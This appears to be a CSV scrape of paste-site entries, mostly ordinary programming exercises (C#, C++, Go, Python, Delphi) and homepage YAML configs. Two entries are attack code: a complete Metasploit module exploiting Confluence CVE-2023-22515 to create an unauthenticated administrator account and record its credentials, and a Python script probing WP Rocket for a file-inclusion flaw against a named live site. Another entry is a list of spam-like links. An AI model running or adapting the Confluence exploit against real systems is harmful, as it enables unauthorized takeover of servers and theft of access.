id,title,username,language,date,content
xr47MGTm,CombiningIntoOneCollection,UrayFenn,C#,Thursday 29th of February 2024 09:22:15 AM CDT,"namespace CombiningIntoOneCollection
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int[] firstNumbers = { 1, 2, 1 };
            int[] secondNumbers = { 3, 2 };
            List<int> list = new List<int>();

            AddValue(list, firstNumbers);
            AddValue(list, secondNumbers);
            EnumerationNumber(list);
        }

        static void AddValue(List<int> list, int[] array)
        {
            for (int i = 0; i < array.Length; i++)
            {
                if (list.Contains(array[i]) == false)
                {
                    list.Add(array[i]);
                }
            }
        }

        static void EnumerationNumber(List<int> list)
        {
            foreach (var number in list)
            {
                Console.Write(number + "" "");
            }
        }
    }
}"
gkqPPLrC,Atlassian Confluence Data Center and Server - Authentication Bypass (Metasploit) - CVE-2023-22515,FlyFar,Python,Thursday 29th of February 2024 09:19:04 AM CDT,"##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Atlassian Confluence Data Center and Server Authentication Bypass via Broken Access Control',
        'Description' => %q{
          This module exploits a broken access control vulnerability in Atlassian Confluence servers leading to an authentication bypass.
          A specially crafted request can be create new admin account without authentication on the target Atlassian server.
        },
        'Author' => [
          'Unknown', 
          'Emir Polat' # metasploit module
        ],
        'References' => [
          ['CVE', '2023-22515'],
          ['URL', 'https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-22515'],
          ['URL', 'https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis']
        ],
        'DisclosureDate' => '2023-10-04',
        'DefaultOptions' => {
          'RPORT' => 8090
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username], regex: /^[a-z._@]+$/),
      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
      OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', Faker::Internet.email])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/login.action')
    )
    return Exploit::CheckCode::Unknown unless res
    return Exploit::CheckCode::Safe unless res.code == 200

    poweredby = res.get_xml_document.xpath('//ul[@id=""poweredby""]/li[@class=""print-only""]/text()').first&.text
    return Exploit::CheckCode::Safe unless poweredby =~ /Confluence (\d+(\.\d+)*)/

    confluence_version = Rex::Version.new(Regexp.last_match(1))

    vprint_status(""Detected Confluence version: #{confluence_version}"")

    if confluence_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.3.2')) ||
       confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.2')) ||
       confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.1'))
      return Exploit::CheckCode::Appears(""Exploitable version of Confluence: #{confluence_version}"")
    end

    Exploit::CheckCode::Safe(""Confluence version: #{confluence_version}"")
  end

  def run
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/server-info.action'),
      'vars_get' => {
        'bootstrapStatusProvider.applicationConfig.setupComplete' => 'false'
      }
    )

    return fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Version vulnerable but setup is already completed') unless res&.code == 302 || res&.code == 200

    print_good('Found server-info.action! Trying to ignore setup.')

    created_user = create_admin_user

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'setup/finishsetup.action'),
      'headers' => {
        'X-Atlassian-Token' => 'no-check'
      }
    )

    return fail_with(Msf::Exploit::Failure::NoAccess, 'The admin user could not be created. Try a different username.') unless created_user

    print_warning('Admin user was created but setup could not be completed.') unless res&.code == 200

    create_credential({
      workspace_id: myworkspace_id,
      origin_type: :service,
      module_fullname: fullname,
      username: datastore['NEW_USERNAME'],
      private_type: :password,
      private_data: datastore['NEW_PASSWORD'],
      service_name: 'Atlassian Confluence',
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      protocol: 'tcp',
      status: Metasploit::Model::Login::Status::UNTRIED
    })

    print_good(""Admin user was created successfully. Credentials: #{datastore['NEW_USERNAME']} - #{datastore['NEW_PASSWORD']}"")
    print_good(""Now you can login as administrator from: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}login.action"")
  end

  def create_admin_user
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'setup/setupadministrator.action'),
      'headers' => {
        'X-Atlassian-Token' => 'no-check'
      },
      'vars_post' => {
        'username' => datastore['NEW_USERNAME'],
        'fullName' => 'New Admin',
        'email' => datastore['NEW_EMAIL'],
        'password' => datastore['NEW_PASSWORD'],
        'confirm' => datastore['NEW_PASSWORD'],
        'setup-next-button' => 'Next'
      }
    )
    res&.code == 302
  end
end
            "
jJskKadi,WP Rocket < 2.10.3 - Local File Inclusion (LFI),FlyFar,Python,Thursday 29th of February 2024 09:16:55 AM CDT,"
import requests
import time

def check_wp_rocket_version(url):
    version_url = url + ""/wp-rocket/css/rocket.css""
    try:
        response = requests.get(version_url)
        version = response.headers[""X-Powered-By""]
        if ""WP Rocket/"" in version:
            version = version.split(""/"")[1]
            return version
    except Exception as e:
        print(f""Error occurred while fetching WP Rocket version: {e}"")
    return None

def test_wp_rocket_lfi_bug(url):
    lfi_url = url + ""/wp-rocket/inc/vendor/composer/installed.json""
    try:
        response = requests.get(lfi_url)
        if response.status_code == 200:
            return True
    except Exception as e:
        print(f""Error occurred while testing LFI: {e}"")
    return False

def main():
    url = ""http://arvatools.com""
    wp_rocket_version = check_wp_rocket_version(url)
    if wp_rocket_version:
        print(f""WP Rocket Version: {wp_rocket_version}"")
        if wp_rocket_version in [""2.10.0"", ""2.10.1"", ""2.10.2"", ""2.10.3""]:
            result = test_wp_rocket_lfi_bug(url)
            if result:
                print(""LFI vulnerability found in WP Rocket"")
            else:
                print(""LFI vulnerability not found in WP Rocket"")
        else:
            print(""WP Rocket version is not affected by the LFI bug"")
    else:
        print(""Unable to fetch WP Rocket version"")

if __name__ == ""__main__"":
    main()
            "
z86mPLNs,PersonnelAccountingAdvance,UrayFenn,C#,Thursday 29th of February 2024 09:11:15 AM CDT,"namespace PersonnelAccountingAdvance
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandAddDossier = ""1"";
            const string CommandShowAllDossier = ""2"";
            const string CommandDeleteDossier = ""3"";
            const string CommandExitProgram = ""4"";

            Dictionary<string, string> listEmployees = new Dictionary<string, string>();
            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine(""Выберите команду:"");
                Console.WriteLine($""{CommandAddDossier} - Добавить досье."");
                Console.WriteLine($""{CommandShowAllDossier} - Показать список всех досье."");
                Console.WriteLine($""{CommandDeleteDossier} - Удалить досье."");
                Console.WriteLine($""{CommandExitProgram} - Выход их программы."");
                string userInput = Console.ReadLine();
                Console.Clear();

                switch (userInput)
                {
                    case CommandAddDossier:
                        AddDossier(listEmployees);
                        break;

                    case CommandShowAllDossier:
                        ShowAllDossier(listEmployees);
                        break;

                    case CommandDeleteDossier:
                        DeleteDossier(listEmployees);
                        break;

                    case CommandExitProgram:
                        Console.WriteLine(""Вы вышли из программы."");
                        isWork = false;
                        break;

                    default:
                        Console.WriteLine(""Некорректный ввод, попробуйте ввести другую команду."");
                        break;
                }
            }
        }

        static void AddDossier(Dictionary<string, string> listEmployees)
        {
            Console.WriteLine(""Укажите имя сотрудника:"");
            string employeeName = Console.ReadLine();
            Console.WriteLine(""Укажите должность сотрудника:"");
            string employeePosition = Console.ReadLine();

            if (listEmployees.ContainsKey(employeeName))
            {
                Console.WriteLine($""{employeeName} - Уже есть в списке сотрудников."");
            }
            else
            {
                Console.WriteLine($""{employeeName} - Добавлен в список"");
                listEmployees.Add(employeeName, employeePosition);
            }
        }

        static void ShowAllDossier (Dictionary<string, string> listEmployees)
        {
            Console.WriteLine(""Список всех сотрудников:"");

            foreach(var file in listEmployees)
            {
                Console.WriteLine(file.Key + "" "" + file.Value + "" - "");
            }
        }

        static void DeleteDossier(Dictionary<string, string> listEmployees)
        {
            Console.WriteLine(""Укажите имя сотрудника для удаления досье:"");
            string userInput = Console.ReadLine();

            if (listEmployees.ContainsKey(userInput))
            {
                Console.WriteLine($""Досье {userInput} {listEmployees[userInput]} - удалено!"");
                listEmployees.Remove(userInput);
            }
            else
            {
                Console.WriteLine(""Досье такого сотрудника не обнаружено."");
            }
        }
    }
}"
iTLx7VYs,majong,excellent940707,C++,Thursday 29th of February 2024 08:54:14 AM CDT,"#include<bits/stdc++.h>
using namespace std;
bool check(int count_two, int cnt[]){

    bool is_zero=1;
    for(int i=0;i<34;++i){
        if(cnt[i]>0){
            is_zero=0;
            break;
        }
    }
    if(is_zero)return 1;

    bool valid=0;
    for(int i=0;i<34;++i){
        if(cnt[i]>=3){
            cnt[i]-=3;
            valid |= check(count_two, cnt);
            cnt[i]+=3;
        }
    }
    if(count_two>0){
        for(int i=0;i<34;++i){
            if(cnt[i]>=2){
                cnt[i]-=2;
                valid |= check(count_two-1, cnt);
                cnt[i]+=2;
            }
        }
    }
    for(int i=0;i<=6;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
     for(int i=9;i<=15;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
     for(int i=18;i<=24;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
     for(int i=27;i<=31;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
    return valid;
}
int main() {
     int num,cnt[34]={0};
     for(int i=0;i<17;++i){
        cin>>num;
        cnt[num]+=1;
     }
     cout<<check(1,cnt)<<'\n';
    return 0;
}"
WL3jL4Hu,HanomanPribadi,PapiGemezs,PHP,Thursday 29th of February 2024 08:45:18 AM CDT,"{
   ""Pribadi"": [
      {
         ""version"": 1.1
      }
   ]
}"
yKECnWfX,widgets,denogginizer,YAML,Thursday 29th of February 2024 08:37:04 AM CDT,"---
# For configuration options and examples, please see:
# https://gethomepage.dev/latest/configs/service-widgets
# - logo:
    # icon: https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/I_Love_New_York.svg/1101px-I_Love_New_York.svg.png # optional
- resources:
    label: Open Media Vault
    cpu: true
    memory: true
    disk: /
    cputemp: true
    uptime: true
    units: imperial


- search:
    provider: duckduckgo
    target: _blank
- datetime:
    text_size: sm
    format:
      dateStyle: short
      timeStyle: short
- openweathermap:
    #label: Home #optional
    latitude: your lat
    longitude: your long
    units: imperial # or imperial
    provider: openweathermap
    apiKey: your-api # required only if not using provider, this reveals api key in requests
    cache: 5 # Time in minutes to cache API responses, to stay within limits"
L8CFmryK,docker,denogginizer,YAML,Thursday 29th of February 2024 08:36:28 AM CDT,"---
# For configuration options and examples, please see:
# https://gethomepage.dev/latest/configs/docker/

my-docker:
   host: homepage-dockerproxy
   port: 2375
my-docker-dagobah:
   host: 192.168.50.105
   port: 2375
"
mTVRCEex,awefdvesntes,gadungw71,PHP,Thursday 29th of February 2024 08:33:54 AM CDT,"https://www.charidy.com/1709189305582777975
https://www.charidy.com/1709189656213528682
https://www.charidy.com/1709190130104794165
https://eymmzy9298.expandcart.com/index.php?route=product/product&product_id=373
https://eymmzy9298.expandcart.com/index.php?route=product/product&product_id=374
https://ytvggc0896.expandcart.com/index.php?route=product/product&product_id=373
https://ytvggc0896.expandcart.com/index.php?route=product/product&product_id=374
https://filqhd1863.expandcart.com/index.php?route=product/product&product_id=373
https://filqhd1863.expandcart.com/index.php?route=product/product&product_id=374
https://www.taskade.com/p/hd-01HQSX4PYVX4CR431SQQAE75RE
https://www.taskade.com/p/hd-01HQSXMPX9EQSW53W92QR19NJH
https://www.taskade.com/p/2024-tw-01HQSXV0ZN0R8JHRXHHQ6P4J3N
https://github.com/napicudayav1
https://github.com/orgs/mobiggr/discussions/3186
https://github.com/tevaxusenuv15
https://github.com/hayufisik
https://github.com/orgs/mobiggr/discussions/3198
https://github.com/dagosikoyep
https://github.com/orgs/mobiggr/discussions/3233
https://github.com/ziduxodeben17
https://github.com/orgs/mobiggr/discussions/3234
https://github.com/batetevorix19
https://github.com/orgs/mobiggr/discussions/3238
https://demo.hedgedoc.org/s/pqeFJCxfA
https://paiza.io/projects/yhCf45nFs2qKkTulezl2Rg?language=php
https://pastelink.net/9nheybiz
https://hackmd.io/@rerewilli6/HJBi4G0h6
https://snippet.host/whtudm
https://tempaste.com/3ksUNKMXgYE
https://rentry.co/rro455dw
https://binshare.net/SyKOC9FFQKgjRNqsELQA
https://rift.curseforge.com/paste/fb874ebe
https://telegra.ph/slowewww-02-29"
tWn51GHk,settings,denogginizer,YAML,Thursday 29th of February 2024 08:30:32 AM CDT,"---
# For configuration options and examples, please see:
# https://gethomepage.dev/latest/configs/settings
title: Start

providers:
  openweathermap: your-api
  weatherapi: your-api
  
background:
  #image: https://images.unsplash.com/photo-1502790671504-542ad42d5189?auto=format&fit=crop&w=2560&q=80
  image: /images/satellite_03.jpg
  blur: sm # sm, """", md, xl... see https://tailwindcss.com/docs/backdrop-blur
  saturate: 50 # 0, 50, 100... see https://tailwindcss.com/docs/backdrop-saturate
  brightness: 50 # 0, 50, 75... see https://tailwindcss.com/docs/backdrop-brightness
  opacity: 50 # 0-100
  
headerStyle: clean

# color: stone
color: sky

showStats: true
  
layout:

  Home:
    tab: Home
    style: row
    columns: 2
    useEqualHeights: true

  Server Monitor:
    tab: Server Monitor
    style: row
    columns: 3
  Disk Usage:
    tab: Disk Usage
    style: row
    columns: 4
    
  Containers:
    tab: Containers
    style: row
    columns: 3

  Media:
    tab: Media
    style: row
    columns: 4
    
  Streaming Now:
    tab: Streaming Now
    style: row
    columns: 2
    
  Feeds:
    tab: Feeds
    style: column
    columns: 2

  Bookmark Group on Fourth Tab:
    style: row
    columns: 6

  Service Group on every Tab:
    style: row
    columns: 6
"
02P1KkGQ,final B,_ums_,Go,Thursday 29th of February 2024 08:18:48 AM CDT,"package main

import (
	""fmt""
	""io/ioutil""
	""sort""
	""strconv""
	""strings""
)

type Node struct {
	value int
	left  *Node
	right *Node
}

type tTmpStore struct {
	leftIndex  int
	rightIndex int
}

func slice2BinaryTree(ss []string, n int) (*Node, []int) {
	if len(ss) == 0 {
		return nil, nil
	}
	var allKeys []int
	myset := make(map[int]bool)
	list := make([]*Node, n)
	m := make(map[int]tTmpStore, n)
	for i := 0; i < n; i++ {
		ss[i] = strings.TrimSpace(ss[i])
		if ss[i] == """" {
			continue
		}

		tmp := strings.Split(ss[i], "" "")
		if len(tmp) < 4 {
			panic(""wrong tree data '"" + ss[i] + ""'"")
		}

		list[i] = &Node{}
		list[i].value, _ = strconv.Atoi(tmp[1])
		myset[list[i].value] = true
		ts := tTmpStore{}
		if tmp[2] != ""-1"" {
			ts.leftIndex, _ = strconv.Atoi(tmp[2])
		}
		if tmp[3] != ""-1"" {
			ts.rightIndex, _ = strconv.Atoi(tmp[3])
		}

		m[i] = ts
	}
	for key, _ := range myset {
		allKeys = append(allKeys, key)
	}
	sort.Ints(allKeys)

	for i := 0; i < n; i++ {
		ts := m[i]
		if ts.leftIndex != 0 {
			list[i].left = list[ts.leftIndex-1]
		}
		if ts.rightIndex != 0 {
			list[i].right = list[ts.rightIndex-1]
		}
	}

	return list[0], allKeys
}

func checkCorrectBst(tree *Node, allKeys map[int]bool) int {
	if tree == nil {
		return 0
	}
	if allKeys[tree.value] != true {
		panic(""Unknown key"")
	}
	size := 1

	if tree.left != nil {
		if tree.left.value > tree.value {
			panic(""Left child is bigger than its parent"")
		}
		size += checkCorrectBst(tree.left, allKeys)
	}
	if tree.right != nil {
		if tree.right.value < tree.value {
			panic(""Right child is smaller than its parent"")
		}
		size += checkCorrectBst(tree.right, allKeys)
	}
	return size
}

// through input.txt
func main() {
	bs, err := ioutil.ReadFile(""input.txt"")
	if err != nil {
		panic(err)
	}

	ss := strings.Split(string(bs), ""\n"")
	if len(ss) < 2 {
		panic(""wrong input"")
	}
	test_type := ss[0]
	n, _ := strconv.Atoi(ss[1])
	tree := &Node{}
	tree = nil
	allKeys := make([]int, 0)
	if n > 0 {
		tree, allKeys = slice2BinaryTree(ss[2:], n)
	}
	if test_type == ""correctness"" {
		toRemove, _ := strconv.Atoi(ss[n+2])
		tree = remove(tree, toRemove)
		myset := make(map[int]bool)
		expectedSize := len(allKeys)

		for _, key := range allKeys {
			myset[key] = true
			if key == toRemove {
				expectedSize -= 1
			}
		}
		actualSize := checkCorrectBst(tree, myset)
		if actualSize != expectedSize {
			panic(""Size of Bst does not match with the answer"")
		}
		fmt.Println(""Correct"")
	} else {
		for _, key := range allKeys {
			tree = remove(tree, key)
		}
		if tree != nil {
			fmt.Println(""FAIL: non-null"")
		} else {
			fmt.Println(""OK: null"")
		}
	}
}

func remove(node *Node, key int) *Node {

	// если дерево пустое
	if node == nil {
		return nil
	}

	deletedNode, prev := findNode(node, nil, key)

	if deletedNode == nil {
		return node
	}

	if deletedNode.right == nil || deletedNode.left == nil {
		var newNode *Node

		if deletedNode.left == nil {
			newNode = deletedNode.right
		} else {
			newNode = deletedNode.left
		}

		if prev == nil {
			return newNode
		}

		if deletedNode == prev.left {
			prev.left = newNode
		} else {
			prev.right = newNode
		}

		deletedNode = nil
	} else {

		leftMaxNode, prevLeftMaxNode := findLeftMaxNode(deletedNode.left, deletedNode)
		deletedNode.value = leftMaxNode.value
		prevLeftMaxNode.right = nil
		leftMaxNode = nil
	}

	return node
}

func findNode(root *Node, prev *Node, value int) (*Node, *Node) {
	if root == nil {
		return nil, nil
	}

	if value < root.value {
		return findNode(root.left, root, value)
	}

	if value > root.value {
		return findNode(root.right, root, value)
	}

	var node *Node
	if value == root.value {
		node = root
	}

	return node, prev
}

func findLeftMaxNode(node, prev *Node) (*Node, *Node) {
	root := node
	for root.right != nil {
		prev = root
		root = root.right
	}
	return root, prev
}
"
mbH8FuW7,Lesson22,smatskevich,C++,Thursday 29th of February 2024 07:55:40 AM CDT,"#include <iostream>
using namespace std;
struct Node {
  int Data;
  Node* Left = nullptr;
  Node* Right = nullptr;
};

void DFS(Node* node) {
  cout << node->Data << "" "";
  if (node->Left) {
    DFS(node->Left);
    cout << node->Data << "" "";
  }
  if (node->Right) {
    DFS(node->Right);
    cout << node->Data << "" "";
  }
}

int main1() {
  Node* root = nullptr;
  int x;
  while (cin >> x, x != 0) {
    if (!root) {
      root = new Node();
      root->Data = x;
      continue;
    }
    Node* node = root;
    while (true) {
      if (node->Data == x) break;
      if (node->Data < x) {
        if (node->Right == nullptr) {
          node->Right = new Node();
          node->Right->Data = x;
          break;
        }
        node = node->Right;
      } else {
        if (node->Left == nullptr) {
          node->Left = new Node();
          node->Left->Data = x;
          break;
        }
        node = node->Left;
      }
    }
  }
  DFS(root);
  return 0;
}

void PreOrderDFS(vector<vector<int>>& t, int u, int p) {
  cout << u << ""\n"";
  for (int v : t[u]) {
    if (v != p)
      PreOrderDFS(t, v, u);
  }
}

int main() {
  int n; cin >> n;
  vector<vector<int>> t(n + 1);
  for (int i = 0; i < n - 1; ++i) {
    int u, v; cin >> u >> v;
    t[u].push_back(v);
    t[v].push_back(u);
  }
  PreOrderDFS(t, 1, -1);
}"
5WWbsjLF,Untitled,asmo12,Batch,Thursday 29th of February 2024 07:55:06 AM CDT,"@echo off
SETLOCAL ENABLEEXTENSIONS 
:: use command  - this_batch_file.cmd src trg 
:: src [in]     - source file name to be converted
:: trg [in,opt] - target file name, leave blank for in-place conversion

set src=%~1
set trg=%~2
set tmp=%temp%.\%~nx1
if ""%trg%""=="""" set trg=%src%

:header
for /f ""delims="" %%a in (%src%) do (
    echo %%a > %tmp%
    goto :body
)

:body
CHCP 1251 >NUL
cmd /D /A /c type ""%src%"" | find /v /i "",contract_date,"">>""%tmp%""
move /y ""%tmp%"" ""%trg%""

ECHO Check your new %trg% in:
ECHO %~ftz1%
PAUSE"
x1rj7zkb,Exemplos de set e get de arrays em Delphi,jacknpoe,Delphi,Thursday 29th of February 2024 07:38:49 AM CDT,"unit Classe;

interface

Type
TClasse = class
  private
    fQuantidade: integer;
    fPagamentos: array of integer;
    fPesos: array of double;
  public
    function GetQuantidade: integer;
    procedure SetQuantidade(valor: integer);
    function GetPagamentos(indice: integer): integer;
    procedure SetPagamentos(indice: integer; valor: integer);
    function GetPesos(indice: integer): double;
    procedure SetPesos(indice: integer; valor: double);

    property Quantidade: integer read GetQuantidade write SetQuantidade;
    property Pagamentos[indice: integer]: integer read GetPagamentos write SetPagamentos;
    property Pesos[indice: integer]: double read GetPesos write SetPesos;
end;

implementation

function TJuros.GetQuantidade: integer;
begin
  result := fQuantidade;
end;

procedure TJuros.SetQuantidade(valor: integer);
begin
  if (valor < 0) then
  begin
    exit;
  end;
  fQuantidade := valor;
  SetLength(fPagamentos, valor);
  SetLength(fPesos, valor);
end;

function TJuros.GetPagamentos(indice: integer): integer;
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    result := 0;
    exit;
  end;
  result := fPagamentos[indice];
end;

procedure TJuros.SetPagamentos(indice: integer; valor: integer);
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    exit;
  end;
  fPagamentos[indice] := valor;
end;

function TJuros.GetPesos(indice: integer): double;
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    result := 0.0;
    exit;
  end;
  result := fPesos[indice];
end;

procedure TJuros.SetPesos(indice: integer; valor: double);
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    exit;
  end;
  fPesos[indice] := valor;
end;

end."
hj8HsMyy,rnak,nirajs,Python,Thursday 29th of February 2024 06:46:49 AM CDT,"""""""
votes = [""ABC"",""ACB"",""ABC"",""ACB"",""ACB""]

1st Post ->
A -> 5
B -> 2
C -> 3
D -> 0

A -> []
B -> []


""""""

from collections import defaultdict
class Solution:
    def rankTeams(self, votes: list[str]) -> str:
        ranking = defaultdict(lambda: [0 for x in range(len(votes[0]))])
        for vote in votes:
            for index, c in enumerate(vote):
                ranking[c][index] -= 1
        sorted_teams = sorted(ranking.items(), key=lambda item: (item[1], item[0]))
        print(sorted_teams)
        return """".join(x for x,_ in sorted_teams)

    def rankTeams1(self, votes: list[str]) -> str:
        ranking = defaultdict(lambda: [0 for _ in range(len(votes[0]))])

        for vote in votes:
            for index, c in enumerate(vote):
                    ranking[c][index] += 1
        sorted_teams = sorted(ranking.keys())
        print(sorted_teams)
        return """".join(sorted(sorted_teams, key=lambda x: ranking[x], reverse=True))

    # def testing(self):
    #     c = ""c""
    #     c


sol = Solution()
votes1 = [""ABC"",""ACB"",""ABC"",""ACB"",""ACB""]
votes2 = [""BCA"",""CAB"",""CBA"",""ABC"",""ACB"",""BAC""]
print(sol.rankTeams1(votes2))"
